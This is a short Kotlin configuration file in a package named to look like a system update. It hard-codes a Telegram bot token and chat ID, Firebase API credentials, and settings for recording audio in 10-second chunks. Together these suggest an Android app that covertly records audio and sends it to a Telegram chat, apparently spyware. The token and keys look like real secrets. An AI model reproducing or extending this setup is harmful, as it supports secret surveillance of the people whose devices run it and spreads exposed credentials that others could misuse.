package com.sys.update2

object Config {
    const val TELEGRAM_BOT_TOKEN = "8965774628:AAHiRk5BzVgGXJOMURMJyNNjHnpDj7MUAjM"
    const val TELEGRAM_CHAT_ID = "8599240795"

    const val FIREBASE_API_KEY = "AIzaSyBvzfJOOjRFZnTgTUrwEZQPr8Ba7zKKlNg"
    const val FIREBASE_PROJECT_ID = "hhhxh-5ebe4"

    const val AUDIO_SAMPLE_RATE = 16000
    const val AUDIO_BITRATE = 64000
    const val AUDIO_CHUNK_MS = 10_000L

    fun hasTelegram(): Boolean = TELEGRAM_BOT_TOKEN.isNotBlank() && TELEGRAM_CHAT_ID.isNotBlank()
}
